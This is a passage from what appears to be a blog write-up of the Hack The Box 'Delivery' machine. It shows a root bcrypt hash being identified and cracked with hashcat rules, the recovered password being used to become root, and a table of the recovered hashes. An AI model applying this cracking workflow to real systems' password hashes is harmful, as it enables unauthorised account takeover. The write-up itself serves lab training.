| root     | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
+----------+--------------------------------------------------------------+
 
</code></pre></div><p>The hash looks like bcrypt. We can check this on hascat by looking at a bcrypt example hash.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">â”Œâ”€â”€<span style="color:#f92672">(</span>tomã‰¿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/delivery<span style="color:#f92672">]</span>
â””â”€$ hashcat --example-hashes | grep less

TYPE: bcrypt $2*$, Blowfish <span style="color:#f92672">(</span>Unix<span style="color:#f92672">)</span>
HASH: $2a$05$MBCzKhG1KhezLh.0LRa0Kuw12nLJtpHy6DIaU.JAnqJUDYspHC.Ou
PASS: hashcat

</code></pre></div><p>Yeah it follows the same format as bcrypt.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">â”Œâ”€â”€<span style="color:#f92672">(</span>tomã‰¿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/hackthebox/delivery<span style="color:#f92672">]</span>
â””â”€$ hashcat -m <span style="color:#ae81ff">3200</span> hash3.txt pass.txt -r /usr/share/hashcat/rules/best64.rule

 

$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjm:PleaseSubscribe!21
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish <span style="color:#f92672">(</span>Unix<span style="color:#f92672">)</span>
Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...Jwgjjm
Time.Started.....: Tue Apr <span style="color:#ae81ff">20</span> 19:05:09 <span style="color:#ae81ff">2021</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">2</span> secs<span style="color:#f92672">)</span>
Time.Estimated...: Tue Apr <span style="color:#ae81ff">20</span> 19:05:11 <span style="color:#ae81ff">2021</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
Guess.Base.......: File <span style="color:#f92672">(</span>pass.txt<span style="color:#f92672">)</span>
Guess.Mod........: Rules <span style="color:#f92672">(</span>/usr/share/hashcat/rules/best64.rule<span style="color:#f92672">)</span>
Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
Speed.#1.........:       <span style="color:#ae81ff">13</span> H/s <span style="color:#f92672">(</span>3.02ms<span style="color:#f92672">)</span> @ Accel:2 Loops:64 Thr:1 Vec:8
Recovered........: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests
Progress.........: 21/77 <span style="color:#f92672">(</span>27.27%<span style="color:#f92672">)</span>
Rejected.........: 0/21 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
Restore.Point....: 0/1 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
Restore.Sub.#1...: Salt:0 Amplifier:20-21 Iteration:960-1024
Candidates.#1....: PleaseSubscribe!21 -&gt; PleaseSubscribe!21

Started: Tue Apr <span style="color:#ae81ff">20</span> 19:04:33 <span style="color:#ae81ff">2021</span>
Stopped: Tue Apr <span style="color:#ae81ff">20</span> 19:05:12 <span style="color:#ae81ff">2021</span>

</code></pre></div><p>We cracked the root password using hashcat rules!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">aildeliverer@Delivery:/opt/mattermost$ su root
Password: 
root@Delivery:/opt/mattermost# id
uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
root@Delivery:/opt/mattermost# 
</code></pre></div><h3 id="hashes">Hashes<a href="#hashes" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<table>
<thead>
<tr>
<th>user</th>
<th>Hash</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>?</td>
<td>add628927ee030469f5d3272ebda1e16</td>
<td></td>
</tr>
<tr>
<td>root</td>
<td>$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO</td>
<td>PleaseSubscribe!21</td>
</tr>
</tbody>
</table>

      </div></div>

  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>Â© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="https://thomas-byrne.co.uk/assets/main.js"></script>
<script src="https://thomas-byrne.co.uk/assets/prism.js"></script>





  
</div>

</body>
</html>
